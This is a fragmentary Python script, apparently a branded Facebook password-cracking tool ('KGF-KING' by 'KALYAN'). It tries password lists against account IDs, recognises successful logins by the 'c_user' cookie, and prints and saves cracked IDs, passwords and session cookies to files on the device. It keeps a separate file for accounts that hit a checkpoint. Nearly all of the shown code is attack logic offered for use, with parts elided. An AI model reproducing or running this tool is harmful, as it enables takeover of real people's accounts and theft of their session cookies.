...
try:
    ...
    print('\n \033[1;91m[\033[1;93mKALYAN-143\033[1;91m]\033[1;97m installing futures !...\n')
    time.sleep(0.001)
    os.system('pip install futures')
try:
    import bs4
except ImportError:
    print('\n \033[1;91m[\033[1;93m K A L Y A N.... \033[1;91m]\033[1;97m installing bs4 !...\n')
    time.sleep(0.001)
...
╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝     
\033[0;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[0;31m[\033[1;92m=\033[0;31m] \033[1;92mDEVELOPER  \033[0;31m● \033[1;92mKALYAN MITRO 
\033[0;31m[\033[1;92m=\033[0;31m] \033[1;92mFAECBOOK   \033[0;31m● \033[1;92mKALYAN\033[0;31m-\033[1;92mKING\033[0;31m-\033[1;92m
...
def __API__(ids,passlist,tl,ck):
    global loop,oks,cps
    sys.stdout.write(f"\r\033[0;31m[\033[1;92m=\033[0;31m]\x1b[1;97m~\033[0;31m[\033[1;92mKGF-KING\033[0;31m-\033[1;92mM1\033[0;31m]\x1b[1;97m~\033[0;31m[\033[1;92m{loop}\033[0;31m]\x1b[1;97m~\033[0;31m[\033[1;92mOK\033[0;31m]\x1b[1;97m~\033[0;31m[\033[1;92m{len(oks)}\033[0;31m]"),
    sys.stdout.flush()
    ...
    try:
        for pas in passlist:
            ...
            if 'c_user' in log_cookies:
                ...
                if 'Photoshop' in res:
                    if "Y" in ck:
                        print(f'\r\r\033[0;31m[\033[1;92mKGF-KING-\033[1;92m💚\033[0;31m] \033[1;92m{cid} \033[0;31m● \033[1;92m{pas}')
                        print(f'\r\r\033[0;31m[\033[1;92mCOOKIE\033[0;31m] \x1b[1;97m{coki}');linex()
                        open('/sdcard/KGF-KING-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/KGF-KING-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
                        oks.append(cid)
                        break
                    else:
                        print(f'\r\r\033[0;31m[\033[1;92mKGF-KING-\033[1;92m💚\033[0;31m] \033[1;92m{cid} \033[0;31m● \033[1;92m{pas}')
                ...
                open('/sdcard/KGF-KING-CP.txt', 'a').write(ids + '|' + pas + '\n')
                cps.append(cid)
            else:
                continue
        loop+=1
...
def __API__1(ids,passlist,tl,ck):
    global loop,oks,cps
    sys.stdout.write(f"\r\033[0;31m[\033[1;92m=\033[0;31m]\x1b[1;97m~\033[0;31m[\033[1;92mKGF-KING\033[0;31m-\033[1;92mM2\033[0;31m]\x1b[1;97m~\033[0;31m[\033[1;92m{loop}\033[0;31m]\x1b[1;97m~\033[0;31m[\033[1;92mOK\033[0;31m]\x1b[1;97m~\033[0;31m[\033[1;92m{len(oks)}\033[0;31m]"),
    sys.stdout.flush()
    session=requests.Session()
    ua = upa()
    try:
            ...
            if 'c_user' in log_cookies:
                ...
                if 'Photoshop' in res:
                    if "Y" in ck:
                        ...
                        print(f'\r\r\033[0;31m[\033[1;92mKGF-KING-\033[1;92m💚\033[0;31m] \033[1;92m{cid} \033[0;31m● \033[1;92m{pas}');cek_apk(session,coki)
                        open('/sdcard/KGF-KING-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/KGF-KING-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
                        oks.append(cid)
                        break
            elif 'checkpoint' in log_cookies:
